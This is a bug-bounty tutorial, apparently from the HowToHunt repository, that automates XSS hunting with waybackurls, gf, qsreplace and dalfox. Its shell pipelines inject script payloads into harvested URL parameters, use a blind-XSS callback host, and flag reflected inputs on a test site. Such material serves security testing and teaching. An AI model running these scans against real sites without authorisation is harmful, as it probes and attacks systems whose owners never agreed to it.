# Automating XSS Detection Using Dalfox, WaybackURLs, and GF Patterns

## Prerequisites: Installing Go on Your Machine

Before proceeding, ensure that **Go** is installed on your system. You can install it using the following commands:

```bash
sudo apt install -y golang
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
source .bashrc
```

---

## Hunting Blind XSS Using Dalfox

To detect blind XSS vulnerabilities, follow these steps:

1. Use **WaybackURLs** to extract URLs for the target.
2. Use **GF patterns** to identify possible XSS-vulnerable parameters.
3. Utilize **Dalfox** to detect XSS.

### Execution Command:
```bash
waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && \
cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
```

---

## Hunting Reflected XSS

To identify reflected XSS vulnerabilities, follow these steps:

1. Extract URLs using **WaybackURLs**.
2. Use **qsreplace** to inject payloads and analyze responses.

### Execution Command:
```bash
waybackurls testphp.vulnweb.com | grep '=' | qsreplace '"><script>alert(1)</script>' | \
while read host; do
    curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && \
    echo "$host \033[0;31m Vulnerable"
done
```

---

## Identifying Parameters That Do Not Filter Special Characters

The following command checks whether parameters accept special characters without proper sanitization:

```bash
echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
cat waybackurls.txt | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | \
qsreplace '"><()' | tee combinedfuzz.json && \
cat combinedfuzz.json | while read host; do
    curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && \
    echo -e "$host \033[91m Vulnerable \e[0m \n" || \
    echo -e "$host \033[92m Not Vulnerable \e[0m \n"
done | tee XSS.txt
```

---

## Downloading the Required Tools

The following tools are required for this process:

| Tool | GitHub Repository |
|------|------------------|
| **Dalfox** | [Dalfox](https://github.com/hahwul/dalfox) |
| **WaybackURLs** | [WaybackURLs](https://github.com/tomnomnom/waybackurls) |
| **GF** | [GF](https://github.com/tomnomnom/gf) |
| **GF Patterns** | [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns) |
| **qsreplace** | [qsreplace](https://github.com/tomnomnom/qsreplace) |

A complete script can be found here: [QuickXSS](https://github.com/theinfosecguy/QuickXSS)

---

## Contact Information

For any questions or further discussions, feel free to reach out on Twitter:

- [@g0t_rOoT_](https://twitter.com/g0t_rOoT_)
- [@Fani Malik](https://twitter.com/fanimalikhack)
- [@Faizee Asad](https://twitter.com/faizee_asad)
- [@Prince Prafull](https://twitter.com/princeprafull3)

---

*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*
